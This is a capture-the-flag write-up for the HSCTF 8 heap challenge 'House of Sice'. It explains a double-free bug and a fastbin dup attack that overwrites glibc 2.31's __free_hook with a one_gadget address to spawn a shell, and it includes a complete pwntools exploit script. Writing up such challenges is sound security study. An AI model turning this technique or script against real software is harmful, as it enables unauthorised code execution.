​House of Sice was a Heap Challenge from HSCTF 8  (2021).

It use libc-2.31.

executable was compiled with all protections, as you can see

![](https://imgur.com/7A8sAYr.png)

Well you have a menu where you can sell of buy Deets..

Basically you can allocate up to 16 blocs of 8 bytes, and choose their content which is a 64bit value.

One of the bloc can be allocated with calloc instead of malloc.

You can also free the bloc, and here is the vulnerability, there is no check if the bloc has already been freed,

and the bloc pointer in the index table , is not zeroed.  There is no edit function.

So basically it is a double free vulnerability.

The attack we will use is a classic one, called , fastbin dup

explained here:

[https://github.com/shellphish/how2heap/blob/master/glibc_2.31/fastbin_dup.c](http://)

or here:

[https://hackmd.io/@u1f383/Sy_2pqMAP#fastbin_dup](http://)

Basically we allocate 10 blocs, free 7 of them to fill a tcache line,

then we launch the double free attack, we free the bloc 8, then 9, then 8 again.. in this order..

one of the block will be found two times in the fastbin list , as you can see here:

![](https://imgur.com/xc4m2x4.png)

then we allocate two more tcache blocs.

then:

```
addc(libc.symbols['__free_hook'])

addm(0x51)

addm(onegadgets[1])
```

we allocate the double free bloc with calloc to be sure it is taken from fastbins, and set its value to address we want to write to (__free_hook),

it will be take as the fd/next pointer when the bloc will be allocate a second time..

then we allocate a bloc in between, and we reallocate the same bloc , this time malloc will give us a bloc at __free_hook address

we set the value of the last bloc to one onegadget in libc , that will be written to __free_hook

![](https://imgur.com/a07PCKt.png)

then we just called free on the bloc, which will call our onegadget...and we got SHELL !


```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x98+1100+0', '-e']
context.log_level = 'info'

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./house_of_sice')
libc = ELF('./libc-2.31.so')

host = args.HOST or 'house-of-sice.hsc.tf'
port = int(args.PORT or 1337)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
source ~/gdb.plugins/gef/gef.py
continue
'''.format(**locals())

#===========================================================

def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]

io = start()

io.recvuntil('deet: ', drop=True)
libc.address = int(io.recvuntil('\n', drop=True),16) - libc.symbols['system']
print('libc base = {:#x}'.format(libc.address))

onegadgets = one_gadget('libc.so.6', libc.address)

def addm(val):
  io.sendlineafter('> ', '1')
  io.sendlineafter('> ', '1')
  io.sendlineafter('> ', str(val))

def addc(val):
  io.sendlineafter('> ', '1')
  io.sendlineafter('> ', '2')
  io.sendlineafter('> ', str(val))

def free(idx):
  io.sendlineafter('> ', '2')
  io.sendlineafter('> ', str(idx))

for i in range(7):
 addm(0x41+i)

addm(0x48)
addm(0x49)
addm(0x4a)

for i in range(7): 
 free(i)

free(8)
free(9)
free(8)

addm(0x50)
addm(0x50)

addc(libc.symbols['__free_hook'])
addm(0x51)
addm(onegadgets[1])

pause()
free(0)

io.interactive()

```

*Nobodyisnobody,  still pwning things....*

